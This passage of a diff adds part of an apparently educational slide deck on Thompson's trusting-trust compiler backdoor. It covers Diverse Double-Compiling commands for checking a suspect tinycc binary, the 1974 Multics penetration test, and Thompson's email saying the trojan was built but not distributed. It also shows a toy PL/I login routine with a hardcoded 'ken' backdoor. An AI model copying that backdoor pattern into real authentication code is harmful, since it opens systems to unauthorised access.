+<p>
+It is functionally equivalent to what sA describes, but its bytes
+might differ from \(\texttt{A}\) because \(\texttt{T}\) generates different
+code.
+</p>
+
+<p>
+It contains no trojan inherited from \(\texttt{A}\).
+</p>
+
+</section>
+<section>
+
+<p>
+<b>Step 2 - self-compile</b>
+</p>
+
+<hr />
+
+<p>
+Compute \(\texttt{stage2} = \texttt{stage1(sA)}\).
+</p>
+
+<p>
+Because \(\texttt{stage1}\) behaves exactly as \(\texttt{sA}\)
+specifies, \(\texttt{stage2}\) is the canonical output of
+\(\texttt{sA}\) compiling itself.
+</p>
+
+</section>
+<section>
+
+<p>
+<b>Step 3 - Compare and Decide</b>
+</p>
+
+<hr />
+
+<p>
+Check that \(\texttt{stage2} == \texttt{A}\) bit for bit, using a trusted comparison tool.
+</p>
+
+<ul>
+<li>If equal, \(\texttt{A}\) corresponds exactly to \(\texttt{sA}\), move
+on to code review.</li>
+
+<li>If not equal, \(\texttt{A}\) contains something \(\texttt{sA}\)
+doesn't explain, could be a backdoor or a compiler bug.</li>
+
+</ul>
+
+</section>
+<section>
+
+<p>
+The procedure.
+</p>
+
+<div class="ddc">
+  <div class="row">
+    <div class="tag"><b>0</b>regeneration</div>
+    <div class="flow">
+      <div class="stage hot"><span class="s">A</span><span class="f">suspect tcc</span></div>
+      <span class="arr">&rarr;</span>
+      <div class="stage io"><span class="s">sA</span><span class="f">clean tcc.c</span></div>
+      <span class="arr">&rarr;</span>
+      <div class="stage io"><span class="s">A&prime;</span><span class="f">keep if equal</span></div>
+    </div>
+  </div>
+  <div class="row">
+    <div class="tag"><b>1</b>diverse compile</div>
+    <div class="flow">
+      <div class="stage"><span class="s">T</span><span class="f">gcc</span></div>
+      <span class="arr">&rarr;</span>
+      <div class="stage io"><span class="s">sA</span><span class="f">clean tcc.c</span></div>
+      <span class="arr">&rarr;</span>
+      <div class="stage io"><span class="s">stage1</span><span class="f">no trojan</span></div>
+    </div>
+  </div>
+  <div class="row">
+    <div class="tag"><b>2</b>self-compile</div>
+    <div class="flow">
+      <div class="stage"><span class="s">stage1</span><span class="f">built by gcc</span></div>
+      <span class="arr">&rarr;</span>
+      <div class="stage io"><span class="s">sA</span><span class="f">clean tcc.c</span></div>
+      <span class="arr">&rarr;</span>
+      <div class="stage io"><span class="s">stage2</span><span class="f">what sA says</span></div>
+    </div>
+  </div>
+  <div class="row">
+    <div class="tag"><b>3</b>compare</div>
+    <div class="flow">
+      <div class="stage io"><span class="s">stage2</span><span class="f">from sA</span></div>
+      <span class="arr">==</span>
+      <div class="stage hot"><span class="s">A</span><span class="f">suspect</span></div>
+      <span class="arr">&rarr;</span>
+      <div class="stage">
+        <span class="s">equal: audit sA</span>
+        <span class="s">differ: reject A</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="src src-sh"><span style="color: #989898;"># </span><span style="color: #989898;">tinycc-A, potentially compromised
+</span>cp ./tinycc-quine/build/tcc tinycc-A
+
+<span style="color: #989898;"># </span><span style="color: #989898;">gcc
+</span><span style="color: #00d3d0;">T</span>=/usr/bin/gcc
+
+<span style="color: #989898;"># </span><span style="color: #989898;">0. regeneration
+</span>./tinycc-A -B./tinycc-quine/build <span style="color: #79a8ff;">\</span>
+    -I./tinycc -I./tinycc/include <span style="color: #79a8ff;">\</span>
+    ./tinycc/tcc.c -o A-prime -lm -ldl -lpthread
+
+cmp tinycc-A A-prime
+</pre>
+</div>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="src src-sh"><span style="color: #989898;"># </span><span style="color: #989898;">1. diverse compile
+</span>$<span style="color: #00d3d0;">T</span> -o stage1 ./tinycc/tcc.c -I./tinycc -lm -ldl -lpthread
+
+<span style="color: #989898;"># </span><span style="color: #989898;">2. self-compile
+</span>./stage1 -B./tinycc -I./tinycc -I./tinycc/include <span style="color: #79a8ff;">\</span>
+    ./tinycc/tcc.c -o stage2 -lm -ldl -lpthread
+
+<span style="color: #989898;"># </span><span style="color: #989898;">3. compare
+</span>cmp stage2 tinycc-A
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-org9cd5b0c">
+<h2 id="org9cd5b0c">The Oldest Penetration Testing Report I've Ever Read</h2>
+</section>
+<section>
+
+<p>
+In June 1974 a penetration test was carried out on Multics, one of
+the first time sharing Operating System.
+</p>
+
+
+<div id="orgf15ebf0" class="figure">
+<p><img src="./img/multics.jpg" alt="multics.jpg" width="800px" />
+</p>
+</div>
+
+</section>
+<section>
+
+
+<div id="orga5800c3" class="figure">
+<p><img src="./img/multics-report-1.png" alt="multics-report-1.png" />
+</p>
+</div>
+
+</section>
+<section>
+
+
+<div id="org8679f21" class="figure">
+<p><img src="./img/multics-report-2.png" alt="multics-report-2.png" />
+</p>
+</div>
+
+</section>
+<section>
+
+
+<div id="org4f8f942" class="figure">
+<p><img src="./img/multics-report-3.png" alt="multics-report-3.png" />
+</p>
+</div>
+
+</section>
+<section>
+
+
+<div id="org712a4fc" class="figure">
+<p><img src="./img/multics-report-4.png" alt="multics-report-4.png" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+Supply chain security, 1974.
+</p>
+
+
+<div id="org6c5b21a" class="figure">
+<p><img src="./img/multics-report-5.png" alt="multics-report-5.png" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+And here it is.
+</p>
+
+
+<div id="org5d9f2e7" class="figure">
+<p><img src="./img/multics-report-6.png" alt="multics-report-6.png" />
+</p>
+</div>
+
+</section>
+<section>
+
+<p>
+A simple <code>PL1</code> procedure 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-pl1">greet: procedure;
+
+     dcl  name char (32);
+
+     call read_name (name);
+     if name = "ken" then
+          call say ("you have root privileges");
+     else
+          call say ("Login incorrect");
+
+     end greet;
+</pre>
+</div>
+
+<p>
+\[\texttt{PL1} \rightarrow \texttt{Programming Language One}\]
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org891bccc">
+<h2 id="org891bccc">All things must end!</h2>
+</section>
+<section>
+
+<p>
+Did Thompson build it? 
+</p>
+
+<pre class="example" id="orgd6a7ad8">
+Hi Ken,
+
+I've seen various sources on the internet claiming that the "trojan
+horse" compiler you mentioned in your talk "Reflections on Trusting
+Trust" was actually built, and some further claiming that it was
+distributed.
+
+I'd like to know if these claims are valid.
+
+Thanks for your time.
+
+Cheers,
+Ezra Lalonde
+</pre>
+
+<p>
+<a href="https://micahkepe.com/blog/thompson-trojan-horse/">https://micahkepe.com/blog/thompson-trojan-horse/</a>
+</p>
+
+</section>
+<section>
+
+<pre class="example" id="org170d5fb">
+From: Ken Thompson &lt;ken@google.com&gt;
+Date: Wed, Sep 28, 2011 at 6:27 PM
+Subject: Re: Was compiler from "Reflections" ever built or distributed?
+To: Ezra Lalonde &lt;ezra@usefuliftrue.com&gt;
+
+build and not distributed.
+</pre>
+
+</section>
+<section>
+
+<div class="bigline" id="org80c4a35">
+<p>
+build and not distributed.
+</p>
+
+</div>
+
+</section>
+<section>
+
+
+<div id="orgc5cc8e4" class="figure">
+<p><img src="./img/conclusion-1.png" alt="conclusion-1.png" />
+</p>
+</div>
+
+</section>
+<section>
+
+
+<div id="orga6a3dde" class="figure">
+<p><img src="./img/conclusion-2.png" alt="conclusion-2.png" />
+</p>
+</div>
+
+</section>
+<section>
+
+
+<div id="org9bc63e0" class="figure">
+<p><img src="./img/conclusion-3.png" alt="conclusion-3.png" />
+</p>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-org4125582">
+<h2 id="org4125582"></h2>
+</section>
+</section>
+<section>
+<section id="slide-org37a7a58">
+<h2 id="org37a7a58">References</h2>
+<div class="refs">
+  <p class="ref"><span class="t">Multics Security Evaluation: Vulnerability Analysis</span>
+  <a href="https://conferences.computer.org/sp/pdfs/early/karg74.pdf">https://conferences.computer.org/sp/pdfs/early/karg74.pdf</a></p>
+  <p class="ref"><span class="t">Reflections on Trusting Trust</span>
+  <a href="https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf">https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf</a></p>
+  <p class="ref"><span class="t">Countering Trusting Trust through Diverse Double-Compiling (DDC)</span>
+  <a href="https://dwheeler.com/trusting-trust/">https://dwheeler.com/trusting-trust/</a></p>
+  <p class="ref"><span class="t">Thirty Years Later: Lessons from the Multics Security Evaluation</span>
+  <a href="https://www.acsac.org/2002/papers/classic-multics.pdf">https://www.acsac.org/2002/papers/classic-multics.pdf</a></p>
+  <p class="ref"><span class="t">That Time Ken Thompson Wrote a Backdoor into the C Compiler</span>
+  <a href="https://micahkepe.com/blog/thompson-trojan-horse/">https://micahkepe.com/blog/thompson-trojan-horse/</a></p>
+  <p class="ref"><span class="t">Running the “Reflections on Trusting Trust” Compiler</span>
+  <a href="https://research.swtch.com/nih">https://research.swtch.com/nih</a></p>
+</div>
+</section>
+</section>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/markdown/markdown.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/notes/notes.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/search/search.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/zoom/zoom.js"></script>
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+
+controls: true,
+progress: true,
+history: false,
+center: true,
+slideNumber: false,
+rollingLinks: false,
+keyboard: true,
+mouseWheel: false,
+fragmentInURL: false,
+hashOneBasedIndex: false,
+pdfSeparateFragments: true,
+overview: true,
+
+transition: 'slide',
+transitionSpeed: 'default',
+
+// Plugins with reveal.js 4.x
+plugins: [ RevealMarkdown, RevealNotes, RevealSearch, RevealZoom ],
+
+// Optional libraries used to extend reveal.js
+dependencies: [
+]
+
+});
+</script>
+</body>
+</html>
